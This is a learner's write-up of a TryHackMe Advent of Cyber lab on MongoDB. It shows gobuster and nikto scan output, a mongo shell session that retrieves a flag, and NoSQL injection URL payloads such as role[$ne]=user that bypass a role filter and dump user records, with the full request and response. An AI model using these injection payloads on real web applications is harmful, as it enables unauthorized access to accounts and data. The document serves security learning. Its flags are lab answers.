# Migration Without Security

This room focused on NoSQL databases, in particular the MongoDB. I think we remembered what the difference between the two is. Probably, probably not. 

The point to remember here was that they are fast to look up into meaning *fast queries,* they are also easier to use, don't know how, they *scale easily and also have a flexible data structure.* 

Well I don't know the syntax and I guess following the instructions on the page, I was able to get all flags. 

What they did was quite interesting, in the end, it's not really about the commands, it's really about what you can do or rather think differently about passing the queries. I would pass the queries differently if I knew what queries or how the backend is actually working. How many layers are between the webpage where you are passing the parameters vs what are the intermediate pages, the underlying os and the database in use. All of that. I guess most people start into this thing using websites, which is my first guess as most people would already know coding and know how stuff is built. So, that is what you need to understand how stuff is built. 

From the initial enumeration, we found this: 

- Gobuster gave us some directories, but they seem to be not accessible without the credentials.
    
    ```bash
    ┌──(DarkPhoenix㉿X-men)-[~/thm/AOC/Day7NoSQLVMMongoDB]
    └─$ gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee gobuster.log
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.113.49
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2021/12/09 22:47:09 Starting gobuster in directory enumeration mode
    ===============================================================
    /search               (Status: 302) [Size: 28] [--> /login]
    /img                  (Status: 301) [Size: 173] [--> /img/]
    /login                (Status: 200) [Size: 1751]           
    /Search               (Status: 302) [Size: 28] [--> /login]
    /css                  (Status: 301) [Size: 173] [--> /css/]
    /Login                (Status: 200) [Size: 1751]           
    /js                   (Status: 301) [Size: 171] [--> /js/] 
    /logout               (Status: 302) [Size: 28] [--> /login]
    /flag                 (Status: 302) [Size: 28] [--> /login]
    /dashboard            (Status: 302) [Size: 28] [--> /login]
    /Logout               (Status: 302) [Size: 28] [--> /login]
    /Dashboard            (Status: 302) [Size: 28] [--> /login]
    /SEARCH               (Status: 302) [Size: 28] [--> /login]
    /LogIn                (Status: 200) [Size: 1751]           
    /Flag                 (Status: 302) [Size: 28] [--> /login]
    /LOGIN                (Status: 200) [Size: 1751]           
                                                               
    ===============================================================
    2021/12/09 23:44:59 Finished
    ===============================================================
    ```
    
    All queries would be redirected to `/login` page
    
- Nikto gave us nothing significant. Some of the things it mentioned were you can use `GET` and HEAD
    
    ```bash
    └─$ nikto -ask=no -h http://$IP 2>&1 | tee nikto.log
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          10.10.113.49
    + Target Hostname:    10.10.113.49
    + Target Port:        80
    + Start Time:         2021-12-09 22:51:28 (GMT-5)
    ---------------------------------------------------------------------------
    + Server: nginx/1.14.0 (Ubuntu)
    + Retrieved x-powered-by header: Express
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + Root page / redirects to: /login
    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + Allowed HTTP Methods: GET, HEAD 
    + OSVDB-3092: /login/: This might be interesting...
    + 7889 requests: 0 error(s) and 6 item(s) reported on remote host
    + End Time:           2021-12-09 23:12:41 (GMT-5) (1273 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested
    ```
    
    It also says something anti-clickjacking, which i have no clue what that is. It says XSS Protection Header is not defined, which also I don't know what that is. Everything redirects to `/login` and that is mentioned by Nikto. The allowed methods are `GET` and `HEAD`. I don't know what to about that information. I was also using `POST` to make all the requests. It gave us information about the server which is nginx. I really don't know again what to do with that information or what does it imply. That's important to know what does it do and what does it imply. 
    
- MongoDB results
    
    ```sql
    thm@mongo-server:/$ mongo
    MongoDB shell version v5.0.3
    connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
    Implicit session: session { "id" : UUID("611fd83a-eeef-4a34-9e5a-fb891d3d63db") }
    MongoDB server version: 5.0.3
    ================
    Warning: the "mongo" shell has been superseded by "mongosh",
    which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
    an upcoming release.
    We recommend you begin using "mongosh".
    For installation instructions, see
    https://docs.mongodb.com/mongodb-shell/install/
    ================
    ---
    The server generated these startup warnings when booting: 
            2021-12-10T03:13:23.477+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
            2021-12-10T03:13:44.680+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
    ---
    ---
            Enable MongoDB's free cloud-based monitoring service, which will then receive and display
            metrics about your deployment (disk utilization, CPU, operation statistics, etc).
    
            The monitoring data will be available on a MongoDB website with a unique URL accessible to you
            and anyone you share the URL with. MongoDB may use this information to make product
            improvements and to suggest MongoDB products and deployment options to you.
    
            To enable free monitoring, run the following command: db.enableFreeMonitoring()
            To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
    ---
    > 
    > db.users.findOne({username: "admin"})
    null
    > db.users.findOne({username: "admin", password:"adminpass"})
    null
    > db.users.findOne({username: "admin", password:"$ne":"xyz"})
    uncaught exception: SyntaxError: missing } after property list :
    @(shell):1:51
    > db.users.findOne({username: "admin", password:{"$ne":"xyz"}})
    null
    > db.users.findOne({username: "admin", password:{"$ne":"xyz"}})
    null
    > db.users.findOne({username: "guest", password:{"$ne":"xyz"}})
    null
    > db.users.find()
    > show databases
    admin   0.000GB
    config  0.000GB
    flagdb  0.000GB
    local   0.000GB
    > db.flagdb.find()
    > use flagdb
    switched to db flagdb
    > 
    > 
    > ls
    [native code]
    > show 
    uncaught exception: Error: don't know how to show [] :
    shellHelper.show@src/mongo/shell/utils.js:1211:11
    shellHelper@src/mongo/shell/utils.js:838:15
    @(shellhelp2):1:1
    > help
            db.help()                    help on db methods
            db.mycoll.help()             help on collection methods
            sh.help()                    sharding helpers
            rs.help()                    replica set helpers
            help admin                   administrative help
            help connect                 connecting to a db help
            help keys                    key shortcuts
            help misc                    misc things to know
            help mr                      mapreduce
    
            show dbs                     show database names
            show collections             show collections in current database
            show users                   show users in current database
            show profile                 show most recent system.profile entries with time >= 1ms
            show logs                    show the accessible logger names
            show log [name]              prints out the last segment of log in memory, 'global' is default
            use <db_name>                set current database
            db.mycoll.find()             list objects in collection mycoll
            db.mycoll.find( { a : 1 } )  list objects in mycoll where a == 1
            it                           result of the last line evaluated; use to further iterate
            DBQuery.shellBatchSize = x   set default number of items to display on shell
            exit                         quit the mongo shell
    > show collections
    flagColl
    > db.flagColl.find()
    { "_id" : ObjectId("618806af0afbc09bdf42bd6a"), "flag" : "THM{8814a5e6662a9763f7df23ee59d944f9}" }
    >
    ```
    
    we had been provided with credentials to the server where we use some queries to look for the database and now the important thing to note here is ultimately how fast can you google and can you actually google the right thing. The lapse of thinking also matters. How fast can you think? Well, how fast can you think would obviously depend upon how fast can you look things up and how fast can you understand the output and now that would obviously also depend on how often you have been practicing this thing. For e.g. at the start of  your job, you used to ask questions to everyone, but once you were 3 months in, you were able to understand and then you were able to improve. So, we stick to that methodology. 
    

The login page 

![Untitled](Migration%20Without%20Security%20c541178577524fc1be8e5ca4bd78b334/Untitled.png)

If we enter wrong credentials, we get something like this:

![Untitled](Migration%20Without%20Security%20c541178577524fc1be8e5ca4bd78b334/Untitled%201.png)

What we do want next is to get in which we do as an admin, but using some NoSQL injection tricks.

We do a couple of queries in the search option, which is actually not accessible unless you are admin, so we had to do that using URL. Some of the common ones looked like this `[http://10.10.113.49/search?username=admin&role=user](http://10.10.113.49/search?username=admin&role=user)` We get responses like the username was not found for the above query. We would then try `[http://10.10.113.49/search?username=admin&role[$ne]=user](http://10.10.113.49/search?username=admin&role[$ne]=user)` and that apparently does work and we get the below response and the flag. 

```sql
ID:61733f3a72e3abc63d253929:admin:admin
```

![Untitled](Migration%20Without%20Security%20c541178577524fc1be8e5ca4bd78b334/Untitled%202.png)

We then try a bunch of other queries and retrieve the flags

- HTML codes
    
    ```html
    GET /search?username[$ne]=admin&role[$ne]=guest HTTP/1.1
    Host: 10.10.113.49
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: connect.sid=s%3AReWoLQIkkk0CKfOoHfkUZUihmW_VDwvJ.QkIr73jfr9pLOvVgf%2FRI4atyIGCxPQV%2FkcZtZAgqIcg
    Upgrade-Insecure-Requests: 1
    ```
    
    ```html
    HTTP/1.1 200 OK
    Server: nginx/1.14.0 (Ubuntu)
    Date: Fri, 10 Dec 2021 06:40:01 GMT
    Content-Type: text/html; charset=utf-8
    Connection: close
    X-Powered-By: Express
    ETag: W/"f72-0AeXOLX++etJQQNon9sB8hyDOqU"
    Content-Length: 3954
    
    <!doctype html>
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <title>Gift Request WebApp</title>
    
        <!-- Bootstrap core CSS -->
        <link href="./css/bootstrap.min.css" rel="stylesheet">
    
        <!-- Custom Stylesheet -->
        <link href="./css/style.css" rel="stylesheet">
    
        <!-- Core libraries bootstrap & jquery -->
        <script src="./js/bootstrap5.min.js"></script>
        <script src="./js/jquery-3.6.0.min.js"></script>
    
        <!-- Custom JS code -->
        <script src="./js/script.js"></script>
    
      </head>
    <body>
      <div class="container" style="padding-top: 5%;">
            <img src="./img/aoc3.png" class="rounded mx-auto d-block" alt="Gift Request!">
          <h1 class="display-4">Gift Requests WebApp</h1>
          <p class="lead">Search for a user request in our MongoDB!</p>
            <hr class="my-4">
    
           <form action='/search' method='get'>
              <div class="input-group mb-3">
                <div class="input-group-prepend">
    		    <span class="input-group-text">Username</span>
                </div>
                <input name='username' type="text" class="form-control" placeholder="users requests!" aria-label="username" aria-describedby="basic-addon2">
                <input name='role' type="hidden" value="user">
                <div class="input-group-append">
                  <button type="submit" class="btn btn-success">Search</button>
                </div>
              </div>    
            </form>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61733f3fb1c4479e8f9459f5:john:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61733f3fb1c4479e8f9459f6:viola:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b8c:yas3r:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b8d:ben:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b8e:hack3r:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b8f:l33t:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b90:adm1n:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b91:tryhackme:admin</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b93:moha:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b94:zilla:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:61749a80b534d3a130391b95:xen:user</div>
    	  </code>
    
            </div>
            <div> 
              <h5>Username details</h5><br>
              <code>
    		<div class="alert alert-success" role="alert">ID:6184f516ef6da50433f100f4:mcskidy:admin</div>
    	  </code>
    
            </div>
    
                    <ul>
                    <li><a href="/logout">Logout</a></li>
    
        </div>
      </body>
    </html>
    ```
    

![Untitled](Migration%20Without%20Security%20c541178577524fc1be8e5ca4bd78b334/Untitled%203.png)

```sql
ID:61850fb42f70bd35768c82f2:THM{2ec099f2d602cc4968c5267970be1326}:guest
```

NoSQL for mcskidy record is : `ID:6184f516ef6da50433f100f4:mcskidy:admin`

![Untitled](Migration%20Without%20Security%20c541178577524fc1be8e5ca4bd78b334/Untitled%204.png)